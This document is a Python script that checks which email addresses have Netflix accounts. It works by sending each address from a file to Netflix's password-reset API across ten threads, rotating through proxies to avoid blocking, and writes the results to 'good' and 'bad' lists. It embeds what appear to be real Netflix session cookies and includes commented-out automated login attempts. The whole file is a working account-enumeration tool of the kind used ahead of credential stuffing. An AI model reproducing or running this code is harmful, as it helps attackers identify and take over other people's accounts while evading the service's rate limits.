import os
import sys
import time
from requests_html import HTMLSession
from bs4 import BeautifulSoup
import requests
import threading
import random

header={
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}
#
headers = {
'Accept': "application/json, text/javascript, */*; q=0.01",
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'keep-alive',
'Content-Length': '193',
'Content-Type': 'application/json',
'Cookie': "memclid=056c91e0-2227-4bd4-b971-bfee68de465b; nfvdid=BQFmAAEBEJJo4ZpGGz4L6R5XkQGrLTBAZcrZIvOK4sLOWlWI3IoGHRDFG7oFIHPGRFbM0GWQglRoYsNI%2B%2FGZjkNz2F9WrIKuMG8c933ApOC4gKs2nWjdBw%3D%3D; flwssn=f4ca1e74-351b-49b1-adf2-f2b54bb230ac; clSharedContext=3b206845-29f5-4255-a05f-9800db6b2b7e; SecureNetflixId=v%3D2%26mac%3DAQEAEQABABSoipzjUGVY0V_ZuhUxiqDKliHvfiB6Y4o.%26dt%3D1553408131935; NetflixId=v%3D2%26ct%3DBQAOAAEBEIoFCEOxzstsutwmz_FWPzaBENlVB486e2UtD27csdGy8D5L5pBbex5rsXar_Re3rHDeehtVAiNxTf70pPXb-anvmvtTokgd3XEBjpkE0eZsYW1Hci-NI9dtjPOWsJiRiAcFeQrav1yX_DEdbL4YB5ztptGFprq1a7ShGdR6RevRQjrSVIvKd_w8OSkIXikZrcVoJfssEjQs8GyXaWBcRbdol33HSNOGiIcizLJb3WxKFfwFbUdcXb0D1OCVd86sL6Mqcoy_vDXCpkVT8Xas4VIA3pdCj9NuDmE5myXGmupYKdaJYIhZ21QCAfROJsOIl1a7LrDdOTkxJYdf_Y8txgRzfZ7d7QVOK_pfCW0bqZt5cpASJ-2EuAxLgMXWI0i4Vm-T%26bt%3Ddev%26mac%3DAQEAEAABABSKuDLXc4vTIrr4nYi_oS0YY3v9XxumTaU.; sawContext=true; cL=1553410175571%7C155341017530820641%7C155341017576376572%7C%7C4%7Cnull",
'Host': "www.netflix.com",
'Origin': 'https://www.netflix.com',
'Referer': 'https://www.netflix.com/loginHelp',
'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
'X-Requested-With': 'XMLHttpRequest'
}
cookies = {
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Cache-Control': 'max-age=0',
'Connection': 'keep-alive',
'Content-Length': '312',
'Content-Type': "application/x-www-form-urlencoded",
'Cookie': "memclid=056c91e0-2227-4bd4-b971-bfee68de465b; nfvdid=BQFmAAEBEJJo4ZpGGz4L6R5XkQGrLTBAZcrZIvOK4sLOWlWI3IoGHRDFG7oFIHPGRFbM0GWQglRoYsNI%2B%2FGZjkNz2F9WrIKuMG8c933ApOC4gKs2nWjdBw%3D%3D; flwssn=f4ca1e74-351b-49b1-adf2-f2b54bb230ac; clSharedContext=3b206845-29f5-4255-a05f-9800db6b2b7e; SecureNetflixId=v%3D2%26mac%3DAQEAEQABABSoipzjUGVY0V_ZuhUxiqDKliHvfiB6Y4o.%26dt%3D1553408131935; NetflixId=v%3D2%26ct%3DBQAOAAEBEIoFCEOxzstsutwmz_FWPzaBENlVB486e2UtD27csdGy8D5L5pBbex5rsXar_Re3rHDeehtVAiNxTf70pPXb-anvmvtTokgd3XEBjpkE0eZsYW1Hci-NI9dtjPOWsJiRiAcFeQrav1yX_DEdbL4YB5ztptGFprq1a7ShGdR6RevRQjrSVIvKd_w8OSkIXikZrcVoJfssEjQs8GyXaWBcRbdol33HSNOGiIcizLJb3WxKFfwFbUdcXb0D1OCVd86sL6Mqcoy_vDXCpkVT8Xas4VIA3pdCj9NuDmE5myXGmupYKdaJYIhZ21QCAfROJsOIl1a7LrDdOTkxJYdf_Y8txgRzfZ7d7QVOK_pfCW0bqZt5cpASJ-2EuAxLgMXWI0i4Vm-T%26bt%3Ddev%26mac%3DAQEAEAABABSKuDLXc4vTIrr4nYi_oS0YY3v9XxumTaU.; sawContext=true; cL=1553410175571%7C155341017530820641%7C155341017576376572%7C%7C4%7Cnull",
'Host': 'www.netflix.com',
'Origin': 'https://www.netflix.com',
'Referer': 'https://www.netflix.com/login',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
    }
login_data = {
    'userLoginId': 'ahmed@gmail.com',
    'password': 'qweqwe',
    'rememberMe': 'true',
    'flow': 'websiteSignUp',
    'mode': 'login',
    'action': 'loginAction',
    'withFields': 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode',
    'authURL': '1553358529054.tga7OngHKkcMQj19GZk+7TYw9to=',
    'nextPage' : '',
    'showPassword': '',
    'countryCode': '+92',
    'countryIsoCode': 'PK'
}
login_data1 = {
    'userLoginId': 'ahme12312wqeqwad@gmail.com',
    'password': 'qweqwe',
    'rememberMe': 'true',
    'flow': 'websiteSignUp',
    'mode': 'login',
    'action': 'loginAction',
    'withFields': 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode',
    'authURL': '1553358529054.tga7OngHKkcMQj19GZk+7TYw9to=',
    'nextPage' : '',
    'showPassword': '',
    'countryCode': '+92',
    'countryIsoCode': 'PK'
}
#
# with requests.Session() as s:
#     url = "http://www.netflix.com/login"
#     r = s.get(url)
#     soup = BeautifulSoup(r.content, 'html5lib')
#     login_data['authURL'] = soup.find('input', attrs={'name': 'authURL'})['value']
#     print(login_data['authURL'])
#     r = s.post(url, data=login_data, headers=headers)
#     soup = BeautifulSoup(r.content, 'html5lib')
#
#     print(soup.prettify())



#
# with requests.Session() as s:
#     url = "https://www.netflix.com/api/shakti/va3b2b59b/login/help"
#     r = s.get(url)
#     soup = BeautifulSoup(r.content, 'html5lib')
#
#     print(soup.prettify())



# session = HTMLSession()
# resp = session.get("http://www.netflix.com/login", params=login_data)
# resp.html.render()
# banner = resp.html.find('.ui-message-contents', first=True)
# print(banner.text)


payload = {
    "mode": "enterPasswordReset",
    "action": "nextAction",
    "fields": {
      "forgotPasswordChoice": {
        "value": "email"
      },
      "email": "ahmed@gmail.com"
    },
    "authURL": "1553414130356.i9x3RFQqiNPk06/+pxnJPGvOH2Y="
}

payload1 = {
    "mode": "enterPasswordReset",
    "action": "nextAction",
    "fields": {
      "forgotPasswordChoice": {
        "value": "email"
      },
      "email": "ahmed@gmail.com"
    },
    "authURL": "1553414130356.i9x3RFQqiNPk06/+pxnJPGvOH2Y="
}

proxList = []

class myProxy:
    ip = ""
    id = ""
    passw = ""

# with open('proxyList','r', newline='') as f:
#     for line in f:
#         proxList.append(line)

count = 0
for line in proxList:
    count += 1

# with requests.Session() as s:
#     url = "https://www.netflix.com/login"
#     r = s.get(url)
#     soup = BeautifulSoup(r.content, 'html5lib')
#     payload['fields']['authURL'] = soup.find('input', attrs={'name': 'authURL'})['value']
#     #payload['fields']['authURL'] ='1553414130356.i9x3RFQqiNPk06/+pxnJPGvOH2Y='
#     print(payload)
#     r = requests.post('https://www.netflix.com/api/shakti/va3b2b59b/login/help',headers=headers, json=payload)
#     print(r.text)

from random import randint
sem = threading.Semaphore()
goodsem = threading.Semaphore()
badsem = threading.Semaphore()

countX = 0

def chomp(x):
    if x.endswith("\r\n"):
        return x[:-2]
    if x.endswith("\n") or x.endswith("\r"):
        return x[:-1]
    return x

proxyUserPass = ""
with open('proxy.txt', 'r') as f:
    proxyUserPass = f.read()

myUser = proxyUserPass.split(":")[0]
myPass = proxyUserPass.split(":")[1]

print(myUser)
print(myPass)

def ValidateAccount(myList):

    myPayLoad = {
        "mode": "enterPasswordReset",
        "action": "nextAction",
        "fields": {
            "forgotPasswordChoice": {
                "value": "email"
            },
            "email": "ahmed@gmail.com"
        },
        "authURL": "1553891999822.TUd6JdRRpXbniC4iai6V8fzXHlU="
    }
    mylogin_data = {
        'userLoginId': 'ahmedwre@gmail.com',
        'password': 'qweeqweqwqwe',
        'rememberMe': 'true',
        'flow': 'websiteSignUp',
        'mode': 'login',
        'action': 'loginAction',
        'withFields': 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode',
        'authURL': '',
        'nextPage': '',
        'showPassword': '',
        'countryCode': '+92',
        'countryIsoCode': 'PK'
    }

    for account in myList:

        #someProxy = proxList[randint(0, 500)]
        # proxie = {'http': 'http://' + someProxy.split(":")[2] + ":" + someProxy.split(":")[3].rstrip() + "@" +
        #                   someProxy.split(":")[0] + ":" + someProxy.split(":")[1],
        #           'https': 'https://' + someProxy.split(":")[2] + ":" + someProxy.split(":")[3].rstrip() + "@" +
        #                   someProxy.split(":")[0] + ":" + someProxy.split(":")[1]}

        proxie = {'http': 'http://' + myUser + '-' + str(randint(0,5000)) + ":" + myPass + "@" + "p.webshare.io:80",
                   'https': 'https://' + myUser + '-' + str(randint(0,5000)) + ":" + myPass + "@" + "p.webshare.io:80"}

        # proxie = {'https': 'https://' + someProxy
        #         }

        #http_proxy = 'http://' + chomp(someProxy)
        #https_proxy = 'https://' + chomp(someProxy)

        # proxies1 = {
        #     'http': http_proxy,
        #     'https': https_proxy,
        # }

       #print('http://' + someProxy.split(":")[2] + ":" + someProxy.split(":")[3].rstrip() + "@" +
       #       someProxy.split(":")[0] + ":" + someProxy.split(":")[1])


        myPayLoad["fields"]["email"] = account
        mylogin_data['userLoginId'] = account

        #r = requests.get('https://www.netflix.com/login', proxies=proxies1)

        try:

            r = requests.post('https://www.netflix.com/api/shakti/v6c995d00/login/help', json=myPayLoad, headers=headers,
                              proxies=proxie)
            print (r)
            if r.json()['mode'] == 'enterPasswordReset':
                goodsem.acquire()
                with open('bad.txt','a') as bad:
                    bad.write(myPayLoad["fields"]["email"])
                goodsem.release()
            else:
                badsem.acquire()
                with open('good.txt','a') as good:
                    good.write(myPayLoad["fields"]["email"])
                badsem.release()
        except Exception as e:
            print(e)
            print("some stupid proxy failed")

        time.sleep(10)

def split_list(alist, wanted_parts=1):
    length = len(alist)
    return [ alist[i*length // wanted_parts: (i+1)*length // wanted_parts]
             for i in range(wanted_parts) ]


wantThreads = 10

myAccounts = []
with open('accounts.txt','r') as f:
    myAccounts = f.readlines()

splitedList = split_list(myAccounts,wantThreads)

print (splitedList)

thread_list = []
i=0
for subList in splitedList:
    thread = threading.Thread(target=ValidateAccount, args=(subList,))
    thread_list.append(thread)
    thread.start()
    time.sleep(1)
    i += 1






